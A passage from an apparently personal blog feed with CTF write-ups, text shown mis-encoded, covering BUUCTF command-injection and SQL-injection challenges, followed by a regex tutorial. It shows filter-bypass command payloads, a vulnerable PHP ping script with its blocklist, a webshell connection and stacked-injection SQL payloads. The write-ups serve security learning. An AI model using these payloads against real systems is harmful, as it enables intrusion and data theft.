¹ç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªåä¸ºflagçš„æ–‡ä»¶</p><p>pingï¼š<code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn | cat /flag</code></p><p>å¾—flag</p><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>ç‚¹å¼€å®¹å™¨</p><p><strong>ç›´æ¥å¼€å§‹ping</strong></p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\11.png" alt="11"></p><p><strong>å‘ç°ä¸èƒ½payloadé‡Œé¢ä¸èƒ½æœ‰ç©ºæ ¼</strong><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\12.png" alt="12"></p><p><strong>è¡¥å……ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼ˆå‘½ä»¤æ‰§è¡Œç©ºæ ¼ç»•è¿‡ï¼‰</strong>ï¼š</p><p><code> &lt;</code> <code>&lt;&gt;</code> <code>&gt;</code> é‡å®šå‘ç¬¦<br> <code>%09</code>(éœ€è¦phpç¯å¢ƒ)<br> <code>$&#123;IFS&#125; </code><br> <code>$IFS$9</code><br> <code>&#123;cat,flag.php&#125;</code>  //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½<br> <code>%20 </code></p><p><strong>é‚£ä¹ˆæˆ‘ä»¬å°è¯•ç”¨é‡å®šå‘ç¬¦ç»•è¿‡</strong><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\13.png" alt="13"></p><p>å‘ç°éƒ¨åˆ†ç¬¦å·ä¹Ÿè¢«ç¦ç”¨äº†ï¼Œ</p><p>é‚£ä¹ˆæˆ‘ä»¬å°è¯•ç”¨<code>$IFS$9</code>ç»•è¿‡ï¼Œç»•è¿‡æˆåŠŸï¼Œå°è¯•cat flag<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\14.png" alt="14"></p><p>å‘ç°flagéƒ½è¢«ç¦äº†ï¼Œé‚£æˆ‘ä»¬cat index.phpï¼Œå¾—ä¸€æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒç¦ç”¨äº†å¾ˆå¤šçš„ç¬¦å·ï¼Œè¿™è¾¹è¦æ³¨æ„å®ƒä¸¥æ ¼è¿‡æ»¤äº†flagâ€”â€”åªè¦å­—ç¬¦ä¸²ä¸­æœ‰æŒ‰é¡ºåºå­˜åœ¨<code>f</code> <code>l</code> <code>a</code> <code>g</code>å°±ä¼šè¢«è­¦å‘Š</p><p><strong>æ³•1</strong>ï¼šç”±äºå­˜åœ¨shell_execï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è®¾å‚ï¼Œå¦‚æ„é€ payloadï¼š<code>?ip=127.0.0.1;m=ag;n=fl;cat$IFS$9$n$m.php</code></p><p>è¿™å¥è¯å…¶å®åœ¨ç»ˆç«¯å°±æ‰§è¡Œäº†ä¸¤å¥è¯ï¼Œä¸€ä¸ªæ˜¯pingç«¯å£127.0.0.1ï¼Œå¦ä¸€ä¸ªæ˜¯æ‰§è¡Œcat flag.phpæ–‡ä»¶ã€‚ä¸­é—´ä¸¤å¥æ˜¯è®¾ç½®å˜é‡èµ‹å€¼ã€‚</p><p><strong>æ³•2ï¼š</strong>å†…è”æ‰§è¡Œ</p><p>åå¼•å·åœ¨linuxä¸­ä½œä¸ºå†…è”æ‰§è¡Œï¼Œæ‰§è¡Œè¾“å‡ºç»“æœã€‚ä¹Ÿå°±æ˜¯è¯´</p><p> cat  ```ls` ``â€”â€”å…ˆæ‰§è¡Œlsï¼Œè¾“å‡º index.php å’Œ flag.php ã€‚ç„¶åå†æ‰§è¡Œ cat index.php;cat flag.php</p><p>è¿™æ ·æŸ¥çœ‹è¿”å›é¡µé¢çš„æºç ï¼Œå¾—ï¼š<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\15.png" alt="15"></p><p>å‚è€ƒï¼š</p><p>å‘½ä»¤æ‰§è¡Œç»•è¿‡ï¼š<a href="https://www.dazhuanlan.com/2019/12/09/5dee4883dad99/">https://www.dazhuanlan.com/2019/12/09/5dee4883dad99/</a></p><p><a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p><p>wpï¼š<a href="https://blog.csdn.net/vanarrow/article/details/108295481">https://blog.csdn.net/vanarrow/article/details/108295481</a></p><p><a href="https://blog.csdn.net/qq_46184013/article/details/107061110?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control&amp;dist_request_id=1328767.72324.16177154446992417&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control">https://blog.csdn.net/qq_46184013/article/details/107061110?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control&amp;dist_request_id=1328767.72324.16177154446992417&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control</a></p><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h1><p>ç‚¹å¼€å®¹å™¨ï¼Œå‘ç°ç›´æ¥ç»™äº†æˆ‘ä»¬ä¸€å¥è¯æœ¨é©¬</p><p>æˆ‘ä»¬ç”¨èšå‰‘è¿æ¥ï¼Œå¯†ç Syc</p><p>ç‚¹å‡»è™šæ‹Ÿç»ˆç«¯ï¼Œ<code>cat /flag</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\16.png" alt="16"></p><h1 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨ï¼šï¼ˆsqlå †å æ³¨å…¥-æ•°æ®åº“è¯­å¥çš„ä½¿ç”¨ï¼‰"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨ï¼šï¼ˆsqlå †å æ³¨å…¥-æ•°æ®åº“è¯­å¥çš„ä½¿ç”¨ï¼‰" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ï¼šï¼ˆsqlå †å æ³¨å…¥+æ•°æ®åº“è¯­å¥çš„ä½¿ç”¨ï¼‰"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ï¼šï¼ˆsqlå †å æ³¨å…¥+æ•°æ®åº“è¯­å¥çš„ä½¿ç”¨ï¼‰</h1><p>ç‚¹å¼€å®¹å™¨<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\17.png" alt="17"></p><p>æ˜¯ä¸€é“sqlæ³¨å…¥é¢˜ï¼Œå…ˆæ‹¿sqlmapè·‘ä¸€ä¸‹ï¼Œå‘ç°è·‘ä¸å‡ºæ¥ã€‚é‚£å°±æ‰‹å·¥æ³¨å…¥å§</p><p><strong>çŒœæ³¨å…¥ç±»å‹ï¼š</strong><code>0&#39; or 1=1#</code>  æŸ¥è¯¢æœ‰ç»“æœ<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\22.png" alt="22"></p><p>â€‹                       <code>0&#39; or 1=2#</code>æŸ¥è¯¢æ— ç»“æœ</p><p><strong>çŒœå­—æ®µï¼š</strong><code>1&#39; order by 2# </code>     æŸ¥è¯¢æœ‰ç»“æœ</p><p>â€‹               <code>1&#39; order by 3# </code>  æŸ¥è¯¢æ— ç»“æœ</p><p><strong>æŸ¥çœ‹è¿”å›å€¼ï¼š</strong><code>1&#39; union select 1,2#   </code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\18.png" alt="18"></p><p>å‘ç°å®ƒä½¿ç”¨æ­£åˆ™åŒ¹é…è¿‡æ»¤æ‰äº†å¾ˆå¤šè¯ï¼Œå°è¯•ä¸€ä¸‹å †å æ³¨å…¥ã€‚</p><p><strong>çˆ†åº“ï¼š</strong>payloadï¼š<code>1&#39;;show databases#</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\19.png" alt="19"></p><p><strong>çˆ†è¡¨ï¼š</strong>payloadï¼š<code>1&#39;;show tables#</code>  </p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\20.png" alt="20"></p><p>è¿™é‡Œå…¶å®æœ‰ä¸ªç–‘æƒ‘ï¼Œå°±æ˜¯æˆ‘ä»¬æŸ¥è¡¨æ²¡æŒ‡æ˜åº“ï¼Œä¸åº”è¯¥è·³å‡ºæ‰€æœ‰çš„è¡¨å—ï¼Ÿä½†æ˜¯ä»–è·³å‡ºæ¥çš„æ˜¯supersqliåº“é‡Œçš„è¡¨ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p><strong>çˆ†åˆ—ï¼š</strong>payloadï¼š1â€™; show columns from <code>`1919810931114514`</code>#</p><p>sp:å½“å­—ç¬¦ä¸²ä¸ºè¡¨åï¼Œå¼•ç”¨æ—¶è¦åŠ åå•å¼•å·<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\21.png" alt="21"></p><p><code>1919810931114514</code>è¡¨ä¸­åªæœ‰flagä¸€åˆ—ï¼Œç”±æ­¤çœ‹æ¥ï¼Œ<code>1919810931114514</code>ä¸æ˜¯é»˜è®¤è¡¨ï¼Œè®¿é—®ä¸€ä¸‹<code>words</code>è¡¨â€”â€”<code>1&#39;; show columns from words#</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\23.png" alt="23"></p><p>wordsè¡¨ä¸­å«æœ‰dataå’Œidä¸¤ä¸ªåˆ—ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŒœæµ‹æ•°æ®åº“ä¸­çš„æŸ¥è¯¢è¯­å¥å¯èƒ½æ˜¯<code>select id,data from words where id=</code></p><p>è€Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è·å–åˆ—flagçš„å€¼ </p><p><strong>æ³•1ï¼š</strong>ç”±äºæˆ‘ä»¬çœ‹åˆ°æ•°æ®åº“é»˜è®¤çš„è¡¨æ˜¯wordsï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•æ”¹é€ <code>`1919810931114514 `</code>â€”â€”å°†wordsè¡¨åæ”¹ä¸ºwords1ï¼Œ<code>1919810931114514</code>æ”¹ä¸ºwordsï¼Œç„¶åå°†åˆ—åflagæ”¹ä¸ºidï¼Œæœ€ååœ¨æ„é€ <code>0&#39; or 1=1#</code>å³å¯</p><p>payloadï¼š<code>1&#39;;rename table words to words1;rename  table </code> <code> `1919810931114514`</code>  <code>to words;alter table words change flag id varchar(100);desc words#</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\24.png" alt="24"></p><p>æˆ‘ä»¬çœ‹åˆ°åŸåˆ—åflagè¢«æ”¹ä¸ºäº†idï¼Œç„¶åpayload:<code>0&#39; or 1=1#</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\25.png" alt="25"></p><p><strong>æ³•2ï¼š</strong></p><p><strong>MySQLæ•°æ®åº“ä¸­è¿˜å¯ä»¥ä½¿ç”¨handleræŸ¥è¯¢å†…å®¹ï¼š</strong></p><p><strong>HANDLER table_name OPEN</strong>â€”â€”æ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œ<br><strong>HANDLER table_name READ FIRST</strong>â€”â€”è·å–æ•°æ®è¡¨ç¬¬ä¸€è¡Œï¼Œé€šè¿‡å°† READ FIRSTæ”¹æˆREAD NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ‰ç‚¹ç±»ä¼¼äºæŒ‡é’ˆã€‚<br><strong>HANDLER table_name CLOSE</strong>â€”â€”æ¥å…³é—­æ‰“å¼€çš„è¡¨ã€‚</p><p><strong>ç´¢å¼•å»æŸ¥çœ‹çš„è¯è¦æŒ‰ä¸Šè¿°ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ï¼š</strong></p><p><strong>HANDLER table_name READ index_name FIRST</strong>â€”â€”è·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚</p><p><strong>ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼š</strong></p><p><strong>HANDLER table_name READ index_name = value</strong>â€”â€”æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬æ„é€ payloadï¼š0â€™;handler  <code>`1919810931114514`</code>  open;handler <code>`1919810931114514`</code> read first#</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\25.png" alt="25"></p><h1 id="SUCTF-2019-EasySQLï¼šï¼ˆsqlå †å æ³¨å…¥ï¼‰"><a href="#SUCTF-2019-EasySQLï¼šï¼ˆsqlå †å æ³¨å…¥ï¼‰" class="headerlink" title="[SUCTF 2019]EasySQLï¼šï¼ˆsqlå †å æ³¨å…¥ï¼‰"></a>[SUCTF 2019]EasySQLï¼šï¼ˆsqlå †å æ³¨å…¥ï¼‰</h1><p>ä¸€é“postå‹sqlæ³¨å…¥é¢˜ï¼Œsqlmapè·‘ä¸€ä¸‹ï¼Œå‘ç°è·‘ä¸å‡ºæ¥</p><p><strong>æ‰‹å·¥æ³¨å…¥ï¼š</strong></p><p>1â€™  æ²¡æœ‰å›æ˜¾ï¼Œå¯èƒ½å±è”½äº†å›æ˜¾æŠ¥é”™ï¼Œé‚£ä¹ˆæŠ¥é”™æ³¨å…¥è‚¯å®šä¸å¯èƒ½äº†</p><p>1â€™ or 1=1#<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\26.png" alt="26"></p><p>1â€˜ and 1=1#ä¹Ÿä¸€æ ·ï¼Œåº”è¯¥æ˜¯<code>andå’Œor</code>è¢«è¿‡æ»¤äº†</p><p>å°è¯•è”åˆæ³¨å…¥ï¼š1â€™ union select 1,2#<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\26.png" alt="26"></p><p>æŸ¥è¯¢æ¡†ä¸­å•ç‹¬è¾“å…¥selectæ²¡æœ‰å›æ˜¾ï¼Œè¾“å…¥union<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\26.png" alt="26"></p><p>çœ‹æ¥unionè¢«è¿‡æ»¤äº†ï¼Œå°è¯•ç›²æ³¨ï¼Œå…ˆè¾“ä¸€ä¸ªsleepï¼ŒåŒæ ·ä¸è®©ï¼Œé‚£ä¹ˆç›²æ³¨ä¹Ÿä¸è¡Œäº†</p><p>è¯•è¯•å †å æ³¨å…¥ï¼š</p><p>è¯•äº†åŠå¤©çš„1â€™;show databases#éƒ½æ²¡å›æ˜¾ï¼Œç„¶åpayloadæ”¹æˆ1;show databases#<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\27.png" alt="27"></p><p>æ‰å‘ç°è¿™é¢˜æ˜¯æ•°å­—å‹æ³¨å…¥</p><p>1;show tables;#<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\28.png" alt="28"></p><p>1;desc flag#<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\26.png" alt="26"></p><p>åˆšå¼€å§‹æˆ‘è¿˜ä»¥ä¸ºä»–è¿‡æ»¤äº†descï¼Œç»“æœå•è¾“flagå‘ç°åŸæ¥æ˜¯è¿‡æ»¤äº†flag</p><p><strong>é‚£ä¹ˆåšåˆ°ç°åœ¨æˆ‘ä»¬å…ˆæ•´ç†ä¸€ä¸‹æ€è·¯â€”â€”</strong></p><p>1.å½“æˆ‘ä»¬è¾“å…¥ä»»æ„æ•°å­—ï¼Œå›æ˜¾éƒ½æ˜¯1<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\29.png" alt="29"></p><p>   è€Œå½“è¾“å…¥éæ•°å­—å†…å®¹æ—¶ï¼Œåˆ™æ— å›æ˜¾</p><p>2.ç”±äºè¿‡æ»¤äº†ï¼Œé‚£ä¹ˆæŸ¥è¯¢è¯­å¥ä¸­è‚¯å®šæœ‰å›ºå®šçš„Flag</p><p>åˆæ­¥çŒœæµ‹å¤§è‡´ä¸ºï¼š select   $query   xxx    from Flag</p><p>3.å°è¯•ç”¨é€—å·éš”å¼€æŸ¥è¯¢åˆ—æ•°</p><p>è¾“å…¥10,2<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\30.png" alt="30"></p><p>è¾“å…¥ 10,8,6<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\31.png" alt="31"></p><p>æˆ‘ä»¬å‘ç°æˆ‘ä»¬è¾“å…¥çš„æœ€åä¸€ä¸ªæ•°è¿”å›çš„æœ¬åº”è¯¥æ˜¯å…¶æœ¬èº«ï¼Œä½†æ˜¯è¿™é‡Œæ— è®ºè¾“å…¥ä»€ä¹ˆè¿”å›éƒ½æ˜¯1</p><p>äºæ˜¯æˆ‘ä»¬çŒœæµ‹ï¼šselect   $query  ||1  from Flag</p><p>æˆ‘ä»¬çŸ¥é“select  *from  Flagæ˜¯è·å–Flagçš„æ‰€æœ‰å†…å®¹</p><p>é‚£ä¹ˆæ­¤å¤„æˆ‘ä»¬å¯ä»¥æ„é€ payloadï¼š$query=*,1  ï¼ˆä»£å…¥æŸ¥è¯¢è¯­å¥ä¸­å°±æ˜¯ï¼šselect   *,1 ||1  from Flag</p><p>ç­‰ä»·äºï¼šselect   *from Flagï¼‰</p><p>æœ€ç»ˆå¾—ï¼š</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\32.png" alt="32"></p><p>è¿™è¾¹æœ‰ä¸€ç‚¹æ³¨æ„ï¼š<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\33.png" alt="33"></p><p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸Šé¢ç¬¬3ç‚¹ä¸ºä»€ä¹ˆæˆ‘ä»¬è¾“å…¥çš„å‰å‡ ä½éƒ½æ˜¯è¿”å›å…¶æœ¬èº«</p><p>å…¶å®è¿˜æœ‰ä¸€ç§ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰æ›´éº»çƒ¦ï¼Œç•™ä¸€ä¸ªpayloadå§ï¼š1;set sql_mode=pipes_as_concat; select 1</p><p>å‚è€ƒåšå®¢ï¼š<code>https://blog.csdn.net/ratear/article/details/109560061</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ACTF2020-æ–°ç”Ÿèµ›-Include&quot;&gt;&lt;a href=&quot;#ACTF2020-æ–°ç”Ÿèµ›-Include&quot; class=&quot;headerlink&quot; title=&quot;[ACTF2020 æ–°ç”Ÿèµ›]Include&quot;&gt;&lt;/a&gt;[ACTF2020 æ–°ç”Ÿèµ›]Include&lt;/h1</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>æ­£åˆ™åŒ¹é…</title>
    <link href="http://example.com/2021/04/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://example.com/2021/04/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2021-04-04T08:04:04.000Z</published>
    <updated>2021-04-04T10:09:39.755Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æ­£åˆ™è¡¨è¾¾å¼ï¼š"><a href="#æ­£åˆ™è¡¨è¾¾å¼ï¼š" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼ï¼š"></a>æ­£åˆ™è¡¨è¾¾å¼ï¼š</h4><p>æè¿°äº†ä¸€ç§å­—ç¬¦ä¸²åŒ¹é…çš„æ¨¡å¼ï¼ˆpatternï¼‰ï¼Œå¯ä»¥ç”¨æ¥æ£€æŸ¥ä¸€ä¸ªä¸²æ˜¯å¦å«æœ‰æŸç§å­ä¸²ã€å°†åŒ¹é…çš„å­ä¸²æ›¿æ¢æˆ–è€…ä»æŸä¸ªä¸²ä¸­å–å‡ºç¬¦åˆæŸä¸ªæ¡ä»¶çš„å­ä¸²ç­‰ã€‚</p><ul><li><strong>æ­£åˆ™è¡¨è¾¾å¼å¸¸ç”¨ä¿®é¥°ç¬¦ï¼š</strong></li></ul><table><thead><tr><th align="left">ä¿®é¥°ç¬¦</th><th align="left">å«ä¹‰</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><strong>i</strong></td><td align="left">ignore - ä¸åŒºåˆ†å¤§å°å†™</td><td align="left">å°†åŒ¹é…è®¾ç½®ä¸ºä¸åŒºåˆ†å¤§å°å†™ï¼Œæœç´¢æ—¶ä¸åŒºåˆ†å¤§å°å†™: A å’Œ a æ²¡æœ‰åŒºåˆ«ã€‚</td></tr><tr><td align="left">g</td><td align="left">global - å…¨å±€åŒ¹é…</td><td align="left">æŸ¥æ‰¾æ‰€æœ‰çš„åŒ¹é…é¡¹ã€‚</td></tr><tr><td align="left">m</td><td align="left">multi line - å¤šè¡ŒåŒ¹é…</td><td align="left">ä½¿è¾¹ç•Œå­—ç¬¦ <strong>^</strong> å’Œ <strong>$</strong> åŒ¹é…æ¯ä¸€è¡Œçš„å¼€å¤´å’Œç»“å°¾ï¼Œè®°ä½æ˜¯å¤šè¡Œï¼Œè€Œä¸æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾ã€‚</td></tr><tr><td align="left">s</td><td align="left">ç‰¹æ®Šå­—ç¬¦åœ†ç‚¹ <strong>.</strong> ä¸­åŒ…å«æ¢è¡Œç¬¦ <strong>\n</strong></td><td align="left">é»˜è®¤æƒ…å†µä¸‹çš„åœ†ç‚¹ <strong>.</strong> æ˜¯ åŒ¹é…é™¤æ¢è¡Œç¬¦ <strong>\n</strong> ä¹‹å¤–çš„ä»»ä½•å­—ç¬¦ï¼ŒåŠ ä¸Š <strong>s</strong> ä¿®é¥°ç¬¦ä¹‹å, <strong>.</strong> ä¸­åŒ…å«æ¢è¡Œç¬¦ \nã€‚</td></tr></tbody></table><ul><li><p><strong>å¸¸è§çš„æ­£åˆ™åŒ¹é…å­—ç¬¦:</strong></p><table><thead><tr><th>å­—ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td>\</td><td><strong>å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºä¸€ä¸ªç‰¹æ®Šå­—ç¬¦</strong>ã€æˆ–ä¸€ä¸ªåŸä¹‰å­—ç¬¦ã€æˆ–ä¸€ä¸ª å‘åå¼•ç”¨ã€æˆ–ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™nâ€™ åŒ¹é…å­—ç¬¦ â€œnâ€ã€‚â€™\nâ€™ åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚åºåˆ— â€˜\\â€˜ åŒ¹é… â€œ\â€œ è€Œ â€œ\(â€œ åˆ™åŒ¹é… â€œ(â€œã€‚</td></tr><tr><td>^</td><td><strong>åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚</strong>å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ^ ä¹ŸåŒ¹é… â€˜\nâ€™ æˆ– â€˜\râ€™ ä¹‹åçš„ä½ç½®ã€‚</td></tr><tr><td>$</td><td><strong>åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚</strong>å¦‚æœè®¾ç½®äº†RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ$ ä¹ŸåŒ¹é… â€˜\nâ€™ æˆ– â€˜\râ€™ ä¹‹å‰çš„ä½ç½®ã€‚</td></tr><tr><td>\d</td><td>åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº [0-9]ã€‚</td></tr><tr><td>\d+</td><td>åŒ¹é…å¤šä¸ªæ•°å­—ã€‚</td></tr><tr><td>\D</td><td>åŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº [ ^0-9]ã€‚</td></tr><tr><td>x|y</td><td>åŒ¹é… x æˆ– yã€‚ä¾‹å¦‚ï¼Œâ€™z|foodâ€™ èƒ½åŒ¹é… â€œzâ€ æˆ– â€œfoodâ€ã€‚â€™(z|f)oodâ€™ åˆ™åŒ¹é… â€œzoodâ€ æˆ– â€œfoodâ€ã€‚</td></tr><tr><td>[xyz]</td><td>å­—ç¬¦é›†åˆã€‚<strong>åŒ¹é…æ‰€åŒ…å«çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦</strong>ã€‚ä¾‹å¦‚ï¼Œ â€˜[abc]â€™ å¯ä»¥åŒ¹é… â€œplainâ€ ä¸­çš„ â€˜aâ€™ã€‚</td></tr><tr><td>[^xyz]</td><td>è´Ÿå€¼å­—ç¬¦é›†åˆã€‚<strong>åŒ¹é…æœªåŒ…å«çš„ä»»æ„å­—ç¬¦</strong>ã€‚ä¾‹å¦‚ï¼Œ â€˜[ ^abc]â€™ å¯ä»¥åŒ¹é… â€œplainâ€ ä¸­çš„â€™pâ€™ã€â€™lâ€™ã€â€™iâ€™ã€â€™nâ€™ã€‚</td></tr><tr><td>[a-z]</td><td>å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™[a-z]â€™ 